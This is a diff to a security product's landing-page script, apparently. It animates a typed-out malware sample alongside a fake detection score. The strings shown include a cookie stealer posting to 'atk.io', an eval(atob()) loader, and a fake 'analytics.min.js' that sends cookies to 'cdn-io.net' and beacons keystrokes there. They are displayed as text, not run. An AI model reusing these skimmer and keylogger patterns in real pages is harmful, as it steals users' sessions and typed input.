@@ -33,9 +33,9 @@ const raf = requestAnimationFrame;
         const DPR = window.devicePixelRatio || 1;
         W = window.innerWidth;
         H = window.innerHeight;
-        canvas.style.width = W + 'px';
+        canvas.style.width  = W + 'px';
         canvas.style.height = H + 'px';
-        canvas.width = Math.round(W * DPR);
+        canvas.width  = Math.round(W * DPR);
         canvas.height = Math.round(H * DPR);
         ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
     }
@@ -126,10 +126,7 @@ const raf = requestAnimationFrame;
     let resizeTimer;
     window.addEventListener('resize', () => {
         clearTimeout(resizeTimer);
-        resizeTimer = setTimeout(() => {
-            resize();
-            cacheGradients();
-        }, 150);
+        resizeTimer = setTimeout(() => { resize(); cacheGradients(); }, 150);
     });
     document.addEventListener('visibilitychange', () => {
         if (!document.hidden) raf(draw);
@@ -154,33 +151,237 @@ qsa('.cracked-word').forEach(el => {
     const el = qs('#heroCode');
     if (!el) return;
 
+    const card    = el.closest('.threat-card');
+    const codeArea = el;
+
+    /* Lock only the CODE AREA height so typewriter never reflows the card */
+    requestAnimationFrame(() => requestAnimationFrame(() => {
+        if (codeArea && !codeArea.style.height) {
+            codeArea.style.height = codeArea.offsetHeight + 'px';
+        }
+    }));
+
+    /* — Threat level system — */
+    const labelEl = qs('#heroThreatLabel');
+
+    function hexToRgba(hex, a) {
+        const r = parseInt(hex.slice(1,3),16), g = parseInt(hex.slice(3,5),16), b = parseInt(hex.slice(5,7),16);
+        return `rgba(${r},${g},${b},${a})`;
+    }
+
+    const LEVELS = {
+        safe:     { label: 'SAFE',            color: '#4ade80' },
+        low:      { label: 'LOW RISK',        color: '#a3e635' },
+        medium:   { label: 'MEDIUM RISK',     color: '#facc15' },
+        high:     { label: 'HIGH RISK',       color: '#fb923c' },
+        critical: { label: 'CRITICAL THREAT', color: '#f87171' },
+    };
+
+    const BAR_GRAD = {
+        safe:     'linear-gradient(90deg,#4ade80,#22c55e)',
+        low:      'linear-gradient(90deg,#a3e635,#65a30d)',
+        medium:   'linear-gradient(90deg,#facc15,#d97706)',
+        high:     'linear-gradient(90deg,#fb923c,#dc2626)',
+        critical: 'linear-gradient(90deg,#f87171,#fb923c)',
+    };
+
+    function setLevel(name) {
+        const { label, color } = LEVELS[name];
+        if (card) {
+            card.style.transition    = 'border-color 1.6s ease, box-shadow 1.6s ease';
+            card.style.borderColor   = hexToRgba(color, 0.28);
+            card.style.boxShadow     = `0 0 40px ${hexToRgba(color, 0.07)}, 0 0 0 1px ${hexToRgba(color, 0.1)} inset`;
+        }
+        if (codeArea) codeArea.style.borderLeftColor = hexToRgba(color, 0.28);
+        if (scoreEl)  scoreEl.style.color = color;
+        if (barFillEl) { barFillEl.style.background = BAR_GRAD[name]; barFillEl.style.boxShadow = `0 0 8px ${hexToRgba(color, 0.45)}`; }
+        if (card) card.querySelectorAll('.threat-card__header svg path').forEach(p => p.setAttribute('stroke', color));
+        if (labelEl) {
+            const CHARS = '!@#%^&*<>[]{}|~/?=+-_.:;';
+            const target = label;
+            const prev = labelEl.textContent;
+            const len = Math.max(prev.length, target.length);
+            let frame = 0;
+            const totalFrames = 10;
+            labelEl.style.color = color;
+            const scramble = setInterval(() => {
+                frame++;
+                const t = frame / totalFrames;
+                let out = '';
+                for (let i = 0; i < len; i++) {
+                    if (i < target.length && Math.random() < t * 1.4) {
+                        out += target[i];
+                    } else if (i < len) {
+                        out += CHARS[Math.floor(Math.random() * CHARS.length)];
+                    }
+                }
+                labelEl.textContent = out.slice(0, Math.max(prev.length, target.length));
+                if (frame >= totalFrames) {
+                    clearInterval(scramble);
+                    labelEl.textContent = target;
+                }
+            }, 30);
+        }
+    }
+
     const lines = [
-        { txt: '// HIGH: Cookie stealing with fetch', cls: 'c-comment' },
-        { txt: 'function stealCookies() {', cls: 'c-kw' },
-        { txt: '  const c = document.cookie;', cls: null },
-        { txt: "  fetch('https://atk.io/c', {", cls: 'c-fn' },
-        { txt: "    method: 'POST',", cls: null },
-        { txt: '    body: JSON.stringify({ c })', cls: null },
-        { txt: '  });', cls: null },
-        { txt: '}', cls: null },
-        { txt: '// Base64 + eval combo', cls: 'c-comment' },
-        { txt: "const enc = 'dmFy..xZA==';", cls: 'c-str' },
-        { txt: 'eval(atob(enc));', cls: 'c-fn' },
+        { txt: '// analytics.min.js v2.3.1',     cls: 'c-comment' },
+        { txt: '(function(w, d) {',              cls: 'c-kw' },
+        { txt: '  var _orig = d.createElement;', cls: null },
+        { txt: "  d['createElement'] = (tag) => {", cls: 'c-kw' },
+        { txt: "    if (tag === 'script') {",    cls: null },
+        { txt: '      var xhr = new XMLHttpRequest();', cls: 'c-fn' },
+        { txt: "      xhr.open('POST','//cdn-io.net/t',!0);", cls: 'c-fn' },
+        { txt: "      xhr.send(btoa(d.cookie+location));", cls: 'c-str' },
+        { txt: '    }; return _orig.call(d,tag); };', cls: null },
+        { txt: "  d.addEventListener('keydown',", cls: 'c-kw' },
+        { txt: '    e => navigator.sendBeacon(', cls: 'c-fn' },
+        { txt: "      '//cdn-io.net/k', e.key));", cls: 'c-str' },
+        { txt: '})(window, document);',          cls: null },
     ];
+
+    /* Detection UI elements */
+    const scoreEl    = qs('#heroScore');
+    const barFillEl  = qs('#heroBarFill');
+    const ruleEls    = [0,1,2,3].map(i => qs('#heroRule'    + i));
+    const rulePctEls = [0,1,2,3].map(i => qs('#heroRulePct' + i));
+
+    function animateNum(el, target, decimals, suffix, duration) {
+        if (!el) return;
+        const start = parseFloat(el.textContent) || 0;
+        const t0 = performance.now();
+        function step(now) {
+            const p = Math.min((now - t0) / duration, 1);
+            const ease = 1 - Math.pow(1 - p, 3);
+            el.textContent = (start + (target - start) * ease).toFixed(decimals) + suffix;
+            if (p < 1) requestAnimationFrame(step);
+        }
+        requestAnimationFrame(step);
+    }
+
+    function showRule(i, pct) {
+        if (ruleEls[i] && !ruleEls[i].classList.contains('rule-visible'))
+            ruleEls[i].classList.add('rule-visible');
+        animateNum(rulePctEls[i], pct, 0, '%', 700);
+    }
+
+    function animateBar(target) {
+        if (!barFillEl) return;
+        barFillEl.style.transition = 'width 1.1s cubic-bezier(.4,0,.2,1)';
+        barFillEl.style.width = target + '%';
+    }
+
+    /* Milestones fire after the line at that index finishes typing */
+    const MILESTONES = {
+        1:  {                    score:  9.2, bar:  6 },
+        2:  { level: 'low',      score: 17.4, bar: 12 },
+        3:  { level: 'medium',   score: 34.8, bar: 24, rules: [{i:0, pct:34}] },
+        4:  {                    score: 44.1, bar: 33 },
+        6:  { level: 'high',     score: 58.7, bar: 46, rules: [{i:0, pct:59}, {i:1, pct:28}] },
+        7:  {                    score: 71.3, bar: 63, rules: [{i:1, pct:62}] },
+        8:  { level: 'critical', score: 77.6, bar: 72 },
+        9:  {                    score: 81.2, bar: 75, rules: [{i:2, pct:24}] },
+        11: {                    score: 88.9, bar: 82, rules: [{i:2, pct:71}, {i:3, pct:38}] },
+        12: {                    score: 93.46, bar: 93.46, rules: [{i:0, pct:96}, {i:1, pct:94}, {i:2, pct:88}, {i:3, pct:76}] },
+    };
+
+    function fireMilestone(idx) {
+        const m = MILESTONES[idx];
+        if (!m) return;
+        if (m.level) setLevel(m.level);
+        animateNum(scoreEl, m.score, 2, '%', 900);
+        if (m.rules) m.rules.forEach(r => showRule(r.i, r.pct));
+        if (m.bar != null) animateBar(m.bar);
+    }
+
+    function resetDetection() {
+        setLevel('safe');
+        if (scoreEl)   scoreEl.textContent = '0.00%';
+        if (barFillEl) { barFillEl.style.transition = 'none'; barFillEl.style.width = '0%'; }
+        ruleEls.forEach((el, i) => {
+            if (!el) return;
+            el.classList.remove('rule-visible');
+            if (rulePctEls[i]) rulePctEls[i].textContent = '0%';
+        });
+    }
 
     let lineIdx = 0,
         charIdx = 0;
     let fullText = '';
 
+    /* ASCII-only glitch chars — same byte-width so lines never stretch */
+    const GLITCH = '!@#%^&*<>[]{}|~/?=+-_.:;';
+
+    function scrambleOut(callback) {
+        /* Strip HTML to plain char grid */
+        const raw = el.textContent.replace(/▌/g, '');
+        const rows = raw.split('\n');
+        const grid = rows.map(r => r.split(''));
+
+        /* Collect all non-space char positions */
+        const positions = [];
+        grid.forEach((row, r) => row.forEach((ch, c) => {
+            if (ch.trim()) positions.push([r, c]);
+        }));
+        /* Shuffle for random corruption order */
+        for (let i = positions.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [positions[i], positions[j]] = [positions[j], positions[i]];
+        }
+
+        function rndGlyph() { return GLITCH[Math.floor(Math.random() * GLITCH.length)]; }
+        function render() { el.textContent = grid.map(r => r.join('')).join('\n'); }
+
+        let idx = 0;
+        const batch = Math.max(2, Math.ceil(positions.length / 18));
+
+        function step() {
+            /* Corrupt next batch */
+            for (let b = 0; b < batch && idx < positions.length; b++, idx++) {
+                const [r, c] = positions[idx];
+                grid[r][c] = rndGlyph();
+            }
+            /* Keep already-corrupted chars alive / mutating */
+            positions.slice(0, idx).forEach(([r, c]) => {
+                if (Math.random() < 0.25) grid[r][c] = rndGlyph();
+            });
+            render();
+
+            if (idx < positions.length) {
+                setTimeout(step, 28);
+            } else {
+                /* Full noise — flash a few more frames then fade out */
+                let flashes = 0;
+                const flash = setInterval(() => {
+                    positions.forEach(([r, c]) => { grid[r][c] = rndGlyph(); });
+                    render();
+                    if (++flashes >= 5) {
+                        clearInterval(flash);
+                        el.style.transition = 'opacity .3s ease';
+                        el.style.opacity = '0';
+                        setTimeout(callback, 320);
+                    }
+                }, 50);
+            }
+        }
+        step();
+    }
+
     function tick() {
         if (lineIdx >= lines.length) {
             setTimeout(() => {
-                el.innerHTML = '';
-                fullText = '';
-                lineIdx = 0;
-                charIdx = 0;
-                tick();
-            }, 3200);
+                scrambleOut(() => {
+                    el.innerHTML = '';
+                    el.style.opacity = '0';
+                    fullText = '';
+                    lineIdx = 0;
+                    charIdx = 0;
+                    resetDetection();
+                    el.style.transition = 'opacity .35s ease';
+                    requestAnimationFrame(() => requestAnimationFrame(() => { el.style.opacity = '1'; }));
+                    tick();
+                });
+            }, 2800);
             return;
         }
 
@@ -200,6 +401,7 @@ qsa('.cracked-word').forEach(el => {
             fullText += cls ?
                 `<span${cls}>${escHtml(line.txt)}</span>\n` :
                 escHtml(line.txt) + '\n';
+            fireMilestone(lineIdx);
             lineIdx++;
             charIdx = 0;
             setTimeout(tick, 80);
@@ -210,6 +412,7 @@ qsa('.cracked-word').forEach(el => {
         return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
     }
 
+    setLevel('safe');
     setTimeout(tick, 600);
 })();
 
@@ -226,29 +429,27 @@ qsa('.cracked-word').forEach(el => {
 
     /* Scale a canvas to physical pixels, keep CSS size unchanged */
     function scaleCanvas(c) {
-        const lw = c.width,
-            lh = c.height;
-        c.style.width = lw + 'px';
+        const lw = c.width, lh = c.height;
+        c.style.width  = lw + 'px';
         c.style.height = lh + 'px';
-        c.width = Math.round(lw * DPR);
+        c.width  = Math.round(lw * DPR);
         c.height = Math.round(lh * DPR);
         return { lw, lh };
     }
 
-    const LAYERS = [{
-            canvas: c1,
-            ...scaleCanvas(c1),
-            left: { n: 8, color: '#00d4ff' },
+    const LAYERS = [
+        {
+            canvas: c1, ...scaleCanvas(c1),
+            left:  { n: 8, color: '#00d4ff' },
             right: { n: 8, color: '#a78bfa' },
-            connColor: 'rgba(0,212,255,0.06)',
+            connColor:  'rgba(0,212,255,0.06)',
             activeConn: 'rgba(0,212,255,0.35)',
         },
         {
-            canvas: c2,
-            ...scaleCanvas(c2),
-            left: { n: 6, color: '#a78bfa' },
+            canvas: c2, ...scaleCanvas(c2),
+            left:  { n: 6, color: '#a78bfa' },
             right: { n: 1, color: '#00ff88' },
-            connColor: 'rgba(167,139,250,0.1)',
+            connColor:  'rgba(167,139,250,0.1)',
             activeConn: 'rgba(0,255,136,0.6)',
         },
     ];
@@ -263,27 +464,16 @@ qsa('.cracked-word').forEach(el => {
     }
 
     LAYERS.forEach(L => {
-        L.leftX = PAD + NODE_R + 2;
+        L.leftX  = PAD + NODE_R + 2;
         L.rightX = L.lw - PAD - NODE_R - 2;
-        L.leftY = buildPositions(L.left.n, L.lh);
+        L.leftY  = buildPositions(L.left.n,  L.lh);
         L.rightY = buildPositions(L.right.n, L.lh);
     });
 
     /* Draw one layer for a given animation tick */
     function drawLayer(L, tick) {
-        const {
-            canvas,
-            lw,
-            lh,
-            left,
-            right,
-            connColor,
-            activeConn,
-            leftX,
-            rightX,
-            leftY,
-            rightY
-        } = L;
+        const { canvas, lw, lh, left, right, connColor, activeConn,
+                leftX, rightX, leftY, rightY } = L;
         const ctx = canvas.getContext('2d');
 
         ctx.clearRect(0, 0, canvas.width, canvas.height);
@@ -329,7 +519,7 @@ qsa('.cracked-word').forEach(el => {
                 ctx.stroke();
             });
         }
-        drawNodes(leftX, leftY, left.color);
+        drawNodes(leftX,  leftY,  left.color);
         drawNodes(rightX, rightY, right.color);
 
         ctx.restore();
@@ -616,17 +806,7 @@ qsa('.cracked-word').forEach(el => {
 })();
 
 
-/* ══════════════════════════════════════════════════
-   10. THREAT CARD BAR — delayed reveal on load
-══════════════════════════════════════════════════ */
-(function initHeroBar() {
-    const fill = qs('.threat-card__bar-fill');
-    if (!fill) return;
-    // Already animated via CSS transition-delay, just ensure it fires
-    setTimeout(() => {
-        fill.style.width = fill.style.width || '93.46%';
-    }, 800);
-})();
+
 
 
 /* ══════════════════════════════════════════════════
